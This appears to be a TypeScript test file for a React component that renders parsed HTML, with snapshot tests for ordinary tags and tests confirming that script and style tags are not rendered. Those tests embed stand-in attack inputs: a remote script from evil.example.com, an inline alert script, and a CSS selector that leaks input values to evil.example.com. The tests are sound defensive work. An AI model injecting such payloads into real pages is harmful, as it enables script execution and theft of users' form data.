import { render } from '@testing-library/react';
import { parseHtml } from '@mya-ake-com/parser';
import { RenderHTML, RenderHTMLProps } from './RenderHTML';
import type { FC } from 'react';

type Replacer = Required<RenderHTMLProps>['replacer'];

describe('tags', () => {
  it('div', () => {
    const { container } = render(
      <RenderHTML htmlNodes={parseHtml(`<div>content</div>`)} />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });

  it('p with class', () => {
    const { container } = render(
      <RenderHTML htmlNodes={parseHtml(`<p class="text">content</p>`)} />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });

  it('a', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<a href="/to-link" rel="noopener">content</a>`)}
      />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });

  it('img', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(
          `<img src="https://example.com/sample.png" alt="sample">`,
        )}
      />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });

  it('br', () => {
    const { container } = render(<RenderHTML htmlNodes={parseHtml(`<br/>`)} />);
    expect(container.firstChild).toMatchSnapshot();
  });

  it('ul li', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<ul><li>item 1</li><li>item 2</ul>`)}
      />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });
});

describe('not render tags', () => {
  it('script', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<script src="https://evil.example.com/evil.js">`)}
      />,
    );
    expect(container.firstChild).toBeNull();
  });

  it('inline script', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<script>alert('Hijacked');</script`)}
      />,
    );
    expect(container.firstChild).toBeNull();
  });

  it('style', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<style src="https://evil.example.com/evil.css">`)}
      />,
    );
    expect(container.firstChild).toBeNull();
  });

  it('inline style', () => {
    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(
          `<style>input[value="a"]{ background-image: url('https://evil.example.com/?t=a'); }</style>`,
        )}
      />,
    );
    expect(container.firstChild).toBeNull();
  });
});

describe('replacer', () => {
  it('p tag to Paragraph', () => {
    const Paragraph: FC = ({ children }) => <p className="p-0">{children}</p>;
    const replacer: Replacer = ({ tagNode, childNodes, attrs, render }) => {
      switch (tagNode.tagName) {
        case 'p':
          return <Paragraph {...attrs}>{render(childNodes)}</Paragraph>;
        default:
          return null;
      }
    };

    const { container } = render(
      <RenderHTML
        htmlNodes={parseHtml(`<p class="text">content</p>`)}
        replacer={replacer}
      />,
    );
    expect(container.firstChild).toMatchSnapshot();
  });
});
